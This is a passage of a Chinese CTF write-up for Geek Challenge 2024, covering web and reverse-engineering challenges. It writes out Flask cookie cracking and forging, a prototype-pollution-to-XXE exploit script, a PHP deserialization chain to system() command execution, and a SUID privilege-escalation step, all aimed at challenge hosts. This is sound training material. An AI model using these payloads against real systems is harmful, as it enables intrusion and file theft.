M.LLL()print(L)m = abs(L[0][0])print(long_to_bytes(int(m)))b&#x27;SYC&#123;1e989433efffd767589e989ad0f091075c06&#125;&#x27; ​ Webpy_game 学习累了就来玩玩游戏休息一下吧 通关真的会给flag吗? 注册，拿到cookie，用flask-unsign爆破flask key： flask-unsign --unsign --cookie &#39;eyJ1c2VybmFtZSI6ImFhYSJ9.ZyUUjg.WtjPt0cu-uBZcQP4mlALEs-LrWM&#39; --wordlist rockyou.txt --no-literal-eval 得到： 1234[*] Session decodes to: &#123;&#x27;username&#x27;: &#x27;aaa&#x27;&#125;[*] Starting brute-forcer with 8 threads..[+] Found secret key after 768 attemptsb&#x27;a123456&#x27; 伪造admin： flask-unsign --sign --cookie &quot;&#123;&#39;username&#39;: &#39;admin&#39;&#125;&quot; --secret a123456 替换cookie，以admin进入 /admin 路由，下载 app.pyc，反编译： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140import jsonfrom lxml import etreefrom flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonifyapp = Flask(__name__)app.secret_key = &#x27;a123456&#x27;app.config[&#x27;xml_data&#x27;] = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;GeekChallenge2024&gt;&lt;EventName&gt;Geek Challenge&lt;/EventName&gt;&lt;Year&gt;2024&lt;/Year&gt;&lt;Description&gt;This is a challenge event for geeks in the year 2024.&lt;/Description&gt;&lt;/GeekChallenge2024&gt;&#x27;class User: def __init__(self, username, password): self.username = username self.password = password def check(self, data): return self.username == data[&#x27;username&#x27;] and self.password == data[&#x27;password&#x27;]admin = User(&#x27;admin&#x27;, &#x27;123456j1rrynonono&#x27;)Users = [admin]def update(src, dst): for k, v in src.items(): if hasattr(dst, &#x27;__getitem__&#x27;): if dst.get(k) and isinstance(v, dict): update(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and isinstance(v, dict): update(v, getattr(dst, k)) else: setattr(dst, k, v)@app.route(&#x27;/register&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def register(): if request.method == &#x27;POST&#x27;: username = request.form[&#x27;username&#x27;] password = request.form[&#x27;password&#x27;] for u in Users: if u.username == username: flash(&#x27;用户名已存在&#x27;, &#x27;error&#x27;) return redirect(url_for(&#x27;register&#x27;)) new_user = User(username, password) Users.append(new_user) flash(&#x27;注册成功！请登录&#x27;, &#x27;success&#x27;) return redirect(url_for(&#x27;login&#x27;)) else: return render_template(&#x27;register.html&#x27;)@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if request.method == &#x27;POST&#x27;: username = request.form[&#x27;username&#x27;] password = request.form[&#x27;password&#x27;] for u in Users: if u.check(&#123;&#x27;username&#x27;: username, &#x27;password&#x27;: password&#125;): session[&#x27;username&#x27;] = username flash(&#x27;登录成功&#x27;, &#x27;success&#x27;) return redirect(url_for(&#x27;dashboard&#x27;)) flash(&#x27;用户名或密码错误&#x27;, &#x27;error&#x27;) return redirect(url_for(&#x27;login&#x27;)) else: return render_template(&#x27;login.html&#x27;)@app.route(&#x27;/play&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def play(): if &#x27;username&#x27; in session: with open(&#x27;/app/templates/play.html&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file: play_html = file.read() return play_html flash(&#x27;请先登录&#x27;, &#x27;error&#x27;) return redirect(url_for(&#x27;login&#x27;))@app.route(&#x27;/admin&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def admin(): if &#x27;username&#x27; in session and session[&#x27;username&#x27;] == &#x27;admin&#x27;: return render_template(&#x27;admin.html&#x27;, username=session[&#x27;username&#x27;]) flash(&#x27;你没有权限访问&#x27;, &#x27;error&#x27;) return redirect(url_for(&#x27;login&#x27;))@app.route(&#x27;/downloads321&#x27;)def downloads321(): return send_file(&#x27;./source/app.pyc&#x27;, as_attachment=True)@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/dashboard&#x27;)def dashboard(): if &#x27;username&#x27; in session: is_admin = session[&#x27;username&#x27;] == &#x27;admin&#x27; if is_admin: user_tag = &#x27;Admin User&#x27; else: user_tag = &#x27;Normal User&#x27; return render_template(&#x27;dashboard.html&#x27;, username=session[&#x27;username&#x27;], tag=user_tag, is_admin=is_admin) flash(&#x27;请先登录&#x27;, &#x27;error&#x27;) return redirect(url_for(&#x27;login&#x27;))@app.route(&#x27;/xml_parse&#x27;)def xml_parse(): try: xml_bytes = app.config[&#x27;xml_data&#x27;].encode(&#x27;utf-8&#x27;) parser = etree.XMLParser(load_dtd=True, resolve_entities=True) tree = etree.fromstring(xml_bytes, parser=parser) result_xml = etree.tostring(tree, pretty_print=True, encoding=&#x27;utf-8&#x27;, xml_declaration=True) return Response(result_xml, mimetype=&#x27;application/xml&#x27;) except etree.XMLSyntaxError as e: return str(e)black_list = [&#x27;__class__&#x27;.encode(), &#x27;__init__&#x27;.encode(), &#x27;__globals__&#x27;.encode()]def check(data): print(data) for i in black_list: print(i) if i in data: print(i) return False return True@app.route(&#x27;/update&#x27;, methods=[&#x27;POST&#x27;])def update_route(): if &#x27;username&#x27; in session and session[&#x27;username&#x27;] == &#x27;admin&#x27;: if request.data: try: if not check(request.data): return (&#x27;NONONO, Bad Hacker&#x27;, 403) data = json.loads(request.data.decode()) print(data) if all((&#x27;static&#x27; not in str(value) and &#x27;dtd&#x27; not in str(value) and (&#x27;file&#x27; not in str(value)) and (&#x27;environ&#x27; not in str(value)) for value in data.values())): update(data, User) return (jsonify(&#123;&#x27;message&#x27;: &#x27;更新成功&#x27;&#125;), 200) return (&#x27;Invalid character&#x27;, 400) except Exception as e: return (f&#x27;Exception: &#123;str(e)&#125;&#x27;, 500) else: return (&#x27;No data provided&#x27;, 400) else: flash(&#x27;你没有权限访问&#x27;, &#x27;error&#x27;) return redirect(url_for(&#x27;login&#x27;))if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80, debug=False) 审计代码，/update 原型链污染 app.config[&#39;xml_data&#39;] 为恶意xml代码，再访问 /xml_parse 触发XXE漏洞读文件。 原型链污染部分，用unicode编码绕过字符串过滤；XXE部分，将payload编码为UTF-16BE绕过。 123456789101112131415161718192021222324252627import requestsimport osurl = &#x27;http://80-cdb52045-af65-4bfe-96b9-57db1b26eac5.challenge.ctfplus.cn&#x27;cookie = &#123; &#x27;session&#x27;:&#x27;eyJ1c2VybmFtZSI6ImFkbWluIn0.ZyUV7A.z-zuf8kzQ61LEbcsR7J4i80SyP0&#x27;&#125;xml_data = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#x27;xml_data2 = os.popen(f&#x27;&#x27;&#x27;echo &#x27;&#123;xml_data&#125;&#x27;| iconv -f utf-8 -t utf-16be&#x27;&#x27;&#x27;).read()print(xml_data2)json = &#123; &#x27;\\u005f_init__&#x27;:&#123; &#x27;\\u005f_globals__&#x27;:&#123; &#x27;app&#x27;:&#123; &#x27;config&#x27;:&#123; &#x27;xml_data&#x27;:xml_data2 &#125; &#125; &#125; &#125;&#125;r = requests.post(f&#x27;&#123;url&#125;/update&#x27;,json=json,cookies=cookie)print(r.text)r = requests.get(f&#x27;&#123;url&#125;/xml_parse&#x27;)print(r.text) 输出flag： 12345&#123;&quot;message&quot;:&quot;\\u66f4\\u65b0\\u6210\\u529f&quot;&#125;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;foo&gt;SYC&#123;4eb08b2f-73a0-4088-9f64-4d6255918cc6&#125;&lt;/foo&gt; ​ PHP不比Java差 Java有的我们PHP也有 反序列化链构造思路： 123456789101112$FUNC=$change($data);$FUNC();$data为反序列化类中的变量和值构成的array利用 [new Challenge(),&#x27;Sink&#x27;]() 动态调用$eee=new $this-&gt;Where($this-&gt;IS);$fff=$this-&gt;Starven;$eee-&gt;$fff($this-&gt;Girlfriend);(new $a($b))-&gt;$c($d); 型用原生类实现 先构造： 123456789101112from phpserialize import *class Challenge: public_file=&#x27;/etc/passwd&#x27;class Geek: public_a=&#x27;x&#x27; public_b=[Challenge(),&#x27;Sink&#x27;]print(serialize(Geek()))# O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125; 123/?change=nextPOSTdata=O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125; 得到提示：The True Flag is in /flag RCE构造： 123456789101112131415161718from phpserialize import *class Syclover: public_Where=&#x27;ReflectionFunction&#x27; public_IS=&#x27;system&#x27; public_Starven=&#x27;invoke&#x27; public_Girlfriend=&#x27;ls -al /&#x27;class Challenge: public_file=Syclover()class Geek: public_a=&#x27;x&#x27; public_b=[Challenge(),&#x27;Sink&#x27;]print(serialize(Geek()))# O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;O:8:&quot;Syclover&quot;:4:&#123;s:10:&quot;Girlfriend&quot;;s:8:&quot;ls -al /&quot;;s:2:&quot;IS&quot;;s:6:&quot;system&quot;;s:7:&quot;Starven&quot;;s:6:&quot;invoke&quot;;s:5:&quot;Where&quot;;s:18:&quot;ReflectionFunction&quot;;&#125;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125; 得到：-r-------- 1 root root 42 Nov 6 11:53 flag 需要提权读/flag，修改命令反弹shell，反弹之后，find / -perm -u=s -type f 2&gt;/dev/null 发现file命令有s权限，file -f /flag 提权读出flag。 ​ Reverseez_hook 有个东西藏起来了,你能找到它吗 去掉反调试 if ( CheckRemoteDebuggerPresent(hProcess, &amp;pbDebuggerPresent) &amp;&amp; pbDebuggerPresent ) return 0; 动调，加密逻辑为：先reverse，再经过长度3的栅栏加密，再修改 sub_4017E0() 函数区域内容为 sub_4018B4()，逐字符异或7，得到密文：zoXpih^lhX6soX7lr~DTHtGpX|。 逆回flag：SYC&#123;you_kn0w_wh@t_1s_hoOk&#125;。 ​ 你干嘛~~ Am1re很喜欢找哥哥，你干嘛啊~~ 分析发现base64字符串 ZmFrZXthcmVfeW08X6JlYWx4X6JpZ7h9fQ==，解码得到fake flag。 动调步进，发现SEH，异常进入catch。 在 sub_4D1A50() 函数发现SM4加密算法特征，如果加密结果和enc不同，则进入 loc_4D1EED，输出fake flag的base64。 获取SM4的key和IV为： key=0O00O0O00OO0O0O0 iv=1III1II111I1I1I1 密文为：enc_hex=216CFDA6B682AFCC516AD1E2A93EA690 解SM4/ZeroBytePadding，得到 qwertyuiopasdfgh。 作为key异或gif文件字节得到原始gif文件，其中一帧图有flag：SYC&#123;111_YOU_WIN_THE_FLAG&#125;. ​ blasting_master 艺术就是爆炸！艺术就是派大星！ 动调发现加密逻辑为： 按下标+1每次循环取4个字符，md5后，对应的16个字符位每位做运算，m[i] = (7*((i+42)^m[i])+82*(i%15))&amp;0xff，存入数组s2。 逆： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&#x27;&#x27;&#x27;# testfrom hashlib import *s = b&#x27;abcdef&#x27;for j in range(len(s)): ss = s[j:j+4] m = list(bytes.fromhex(md5(ss).hexdigest())) for i in range(16): m[i] = (7*((i+42)^m[i])+82*(i%15))&amp;0xff #print(ss) #print([hex(k)[2:] for k in m])&#x27;&#x27;&#x27;from hashlib import md5from Crypto.Util.number import *import stringfrom pwnlib.util.iters import mbruteforcetable = string.printabledef dec(x): t = list(bytes.fromhex(x)) for i in range(16): t[i] = (((t[i]-82*(i%15))*inverse(7,256))^(i+42)) &amp; 0xff return bytes(t).hex()def md5_bruteforce(c): return mbruteforce(lambda x: md5(x.encode()).hexdigest()==c, table, length=4, method=&#x27;fixed&#x27;)c = &#x27;B250A0BC3A7F546D96070F719A72EBA5A0B571A46AB8BAFAE431C3715429A759202B1321BD675F8D653A0227084F929CB57CDF6934B8822DF6CA7A659863DC512A34974FF8BC231F38A8A62FA90D644CAC2FF9F52DB191A8D576D92DC6AC2E6932D5641DC13CECF52C90EDF4178B554CE46C3BB3DA29C07B39DF9273FCC9C2A86811222B643F129B95732A05D33F2E33F185ED077B868F622D7903AC80CEF5B2A00CF7E1C50E6327D16523EA5A1C020B32BA1FE5C722A56677EA5BE464AB8B60B6DF00DCF76D93EC2F2F680750E0D11A3FC64E2EC6BBAE0840D85B11B5DC15357F63493E5B9C0DFC0DB680B72B00EF3C0C2FEB864457749E5F1F8BA1C901F1D8F49282956F85D215221FF09FD1AB51399AB6C4DAFB388DE68C57195E94DA57CCF0B90A4A1782FCC54F4B5AA5F4E53EFA3A0AF4B48E7F25847590CD3587EBC3CE812B86C9167E85682DF1DB8E7415CF955107885E1BE937C95BBA61EB9F7BE48910F06ECD7571AD09745849A3F533837522951BE33C48055CADA86BFD41EBAFC60228C65ECF36AE50CE93F270889D3F4A9F86E76764B002960CAB9FEB4B034492DE6CF4CE324F4F38E25259CA954A11D830A27BD53AE611DA3A4A3361396526D278BCEDBDA58B2B874C95472502BA833DDCE46AAD67DD22B1BD2B7C53113CD923063D20BA28C82D8951576382A0C8A8DE2961C15351B0BC3704EEC9358AA8A266BA6F24B63F62416D1046CB061239D90EF9DC19A765B8C040BEF6999AAF0216374DA5754C424B1AF052DA38F36BA91ADCFA80B060B1FD737B78D9628326BF163371796F112FE9A7BB4646D68FF6217EFC6812866BFC51C9707A74BC8F6E0B86426F5CFDF74E2771FE37E6C86247FCD56CBA5CD9295A73AEC38FF0469532422DD0&#x27;c = [c[32*i:32*(i+1)] for i in range(len(c)//32)]m = [dec(k) for k in c]#print(m)flag = &#x27;&#x27;for i in range(0,len(m),4): flag += md5_bruteforce(m[i]) print(flag)# SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt print(md5_bruteforce(m[-1]))# t!!&#125;# SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt!!&#125; ​ 致我的星星 做到这里应该有点小累了吧，wwzx和tx师傅想给大家打打气，不看html窝真的会伤心的 下载链接链接: https://pan.baidu.com/s/1IHyv4iy0NS1YeV0_EmXhYg?pwd=game 提取码: game 审计 index.js 逻辑： fl(e) 中，按下一串大写字母字符串，md5为 5c50152daeee511f32db7bf8a5502c69 则正确。 先解方程： 123456789101112131415161718192021from z3 import *s = Solver()a1,a2,a3,a4,a5,a6,a7,a8 = [Int(f&#x27;f&#123;i&#125;&#x27;) for i in range(8)]s.add(43654*a1 - 57003*a2 -3158*a3 + 30120*a4 -58621*a5 -41947*a6 +122237*a7 +129534*a8 == 2594143)s.add(-48022*a1 + 18308*a2 + 52478*a3 + 69397*a4 +49696*a5 + 12288*a6 -40437*a7 -23154*a8 == 651137)s.add(124109*a1 +58952*a2 + 16645*a3 -17531*a4 + 53139*a5 +49937*a6 + 3282*a7 +7656*a8 == 2071815)s.add(108286*a1 + 118886*a2 +116876*a3 +2281*a4 -64590*a5 -3021*a6 + 13386*a7 -56070*a8 == 703)s.add(105983*a1 + 8794*a2 + 31851*a3 -35052*a4 -7880*a5 + 2183*a6 + 47575*a7 +107236*a8 == 2511919)s.add(-38005*a1 -6833*a2 +107897*a3 +119771*a4 +124322*a5 + 13335*a6+ 121590*a7 -17434*a8 == 4816084)s.add(60696*a1 +95253*a2 +101581*a3 + 93822*a4 +112989*a5 +65643*a6 +45639*a7 + 26705*a8 == 5330538)s.add(49019*a1 +72343*a2 -21814*a3 +85020*a4 -62332*a5 +99828*a6 + 587*a7 -65119*a8 == 505173)print(s.check())m = s.model()res = []for i in range(8): res.append(m[eval(f&#x27;a&#123;i+1&#125;&#x27;)].as_long())print(res)# [3, 4, 6, 8, 13, 13, 15, 15] 对应S和Y的坐标：S:(3,13) (8,13) 和 Y:(4,15) (6,15)。 往下看，2轮（chance）对应2个迷宫，方向键为：上T下R左S右A，S和Y坐标分别对应每个迷宫的起点和终点，打印迷宫（10*20，补充一行）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445data = [ &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]coordinates = [ [1, 11], [1, 12], [1, 13], [1, 14], [2, 1], [2, 4], [2, 11], [2, 12], [2, 14], [3, 4], [3, 14], [5, 7], [5, 8], [5, 12], [5, 14], [5, 15], [5, 18], [6, 1], [6, 2], [6, 4], [6, 5], [6, 7], [6, 8], [6, 11], [6, 15], [7, 1], [7, 5], [7, 11], [7, 12], [7, 13], [7, 14], [7, 15], [7, 16], [8, 1], [8, 12], [8, 13], [8, 15], [8, 18], [9, 3], [9, 4], [9, 6], [9, 7], [9, 8]]cols = 20rows = 10for (row,col) in coordinates: index = row * cols + col data[index] = &#x27;*&#x27;# S:(3,13) (8,13)# Y:(4,15) (6,15)data[(3-1)*cols+(13-1)] = data[(8-1)*cols+(13-1)] = &#x27;S&#x27;data[(4-1)*cols+(15-1)] = data[(6-1)*cols+(15-1)] = &#x27;Y&#x27;print(len(data))for i in range(10): print(&#x27;&#x27;.join(data[10*i:10*(i+1)]))print()for i in range(10,20): print(&#x27;&#x27;.join(data[10*i:10*(i+1)])) 输出： 1234567891011121314151617181920212223200###############################****######*##*######*S#*#########*#########Y################################**###*#Y*##*##**#**#**##*###*#####*###*#####*S****####*##########**#*##*####**#***########### 第一轮（chance=0），从S到Y路径：STTAAARRRR 第二轮（chance=1），从S到Y路径：AAATTTTS 连起来，加flag壳，得到：SYC&#123;STTAAARRRRAAATTTTS&#125;。 ​ AES! Am1re说AES一学一个不吱声 提取出： 12345key = b&#x27;SYCLOVERSYCLOVER&#x27;c = [0x99, 0xE8, 0xB8, 0x01, 0xC8, 0x82, 0x51, 0x93, 0x12, 0xEE, 0x89, 0x64, 0xE7, 0xEF, 0x63, 0x8D, 0x51, 0xDF, 0x5D, 0x78, 0x39, 0xAA, 0x39, 0x62, 0xA0, 0xB4, 0x50, 0x30, 0x47, 0x30, 0x21, 0x06] 更改了AES的S盒，拿AES源码修改： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;typedef struct&#123; uint32_t eK[44], dK[44]; // encKey, decKey int Nr; // 10 rounds&#125;AesKey;#define BLOCKSIZE 16 //AES-128分组长度为16字节// uint8_t y[4] -&gt; uint32_t x#define LOAD32H(x, y) \\ do &#123; (x) = ((uint32_t)((y)[0] &amp; 0xff)&lt;&lt;24) | ((uint32_t)((y)[1] &amp; 0xff)&lt;&lt;16) | \\ ((uint32_t)((y)[2] &amp; 0xff)&lt;&lt;8) | ((uint32_t)((y)[3] &amp; 0xff));&#125; while(0)// uint32_t x -&gt; uint8_t y[4]#define STORE32H(x, y) \\ do &#123; (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff); \\ (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff); &#125; while(0)// 从uint32_t x中提取从低位开始的第n个字节#define BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)/* used for keyExpansion */// 字节替换然后循环左移1位#define MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \\ ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))// uint32_t x循环左移n位#define ROF32(x, n) (((x) &lt;&lt; (n)) | ((x) &gt;&gt; (32-(n))))// uint32_t x循环右移n位#define ROR32(x, n) (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */// AES-128轮常量static const uint32_t rcon[10] = &#123; 0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL, 0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL&#125;;// S盒/*unsigned char S[256] = &#123; 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16&#125;;*/unsigned char S[256] = &#123;0x7C, 0xCA, 0x7B, 0x77, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0x47, 0xAB, 0x76, 0x63, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 